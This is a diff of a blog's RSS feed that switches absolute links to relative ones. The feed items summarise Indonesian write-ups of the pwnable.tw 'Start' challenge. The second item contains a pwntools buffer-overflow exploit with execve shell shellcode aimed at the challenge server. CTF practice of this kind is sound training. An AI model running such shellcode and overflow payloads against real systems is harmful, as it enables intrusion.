@@ -2,20 +2,20 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>pwnabletw on /home/rhama/</title>
-    <link>rhamaa.github.io/tags/pwnabletw/</link>
+    <link>/tags/pwnabletw/</link>
     <description>Recent content in pwnabletw on /home/rhama/</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     
-	<atom:link href="rhamaa.github.io/tags/pwnabletw/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/tags/pwnabletw/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Pwnable.tw - Start (100)</title>
-      <link>rhamaa.github.io/post/2017-11-06-pwnabletw-start/</link>
+      <link>/post/2017-11-06-pwnabletw-start/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>rhamaa.github.io/post/2017-11-06-pwnabletw-start/</guid>
+      <guid>/post/2017-11-06-pwnabletw-start/</guid>
       <description>Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung.
 Berikut informasi binary start.
 Hasil disassembly menggunaan Binary Ninja pada fungsi _start Diketahui bahwa binary start ditulis menggunakan asm x86 dan menggunakan 3 syscall yaitu write, read dan exit. Referensi tentang syscall dapat dilihat disiniPada bagian warna biru adalah proses pemanggilan syscall write dan bagian warna merah adalah pemanggilan syscall read . Lalu bagian kuning paling bawah adalah prospes stack akan di naikan sebanyak 20 bytes, sehingga Top Of Stack nya adalah alamat dari fungsi _exit dan program akan loncat ke fungsi _exit untuk mengakhiri eksekusi.</description>
@@ -23,10 +23,10 @@ Hasil disassembly menggunaan Binary Ninja pada fungsi _start Diketahui bahwa bin
     
     <item>
       <title>Pwnable.tw - Start (100)</title>
-      <link>rhamaa.github.io/post/2017-11-20-pwnabletw-start/</link>
+      <link>/post/2017-11-20-pwnabletw-start/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>rhamaa.github.io/post/2017-11-20-pwnabletw-start/</guid>
+      <guid>/post/2017-11-20-pwnabletw-start/</guid>
       <description>context(arch=&amp;quot;i386&amp;quot;,os=&amp;quot;linux&amp;quot;)
 # http://shell-storm.org/shellcode/files/shellcode-811.phpshellcode =&amp;quot;&amp;ldquo;shellcode +=&amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73&amp;quot;shellcode +=&amp;quot;\x68\x68\x2f\x62\x69\x6e\x89&amp;quot;shellcode +=&amp;rdquo;\xe3\x89\xc1\x89\xc2\xb0\x0b&amp;quot;shellcode +=&amp;rdquo;\xcd\x80\x31\xc0\x40\xcd\x80&amp;quot;mov_ecx_esp =p32(0x08048087)
 start =remote(&amp;quot;chall.pwnable.tw&amp;quot;,10000) start.recvuntil(&amp;quot;CTF:&amp;ldquo;) payload =&amp;quot;A&amp;quot;20+mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&amp;quot;A&amp;quot;20+p32(stack_addr+20)+&amp;quot;\x90&amp;quot;*4+shellcode start.sendline(payload_next) start.interactive() </description>
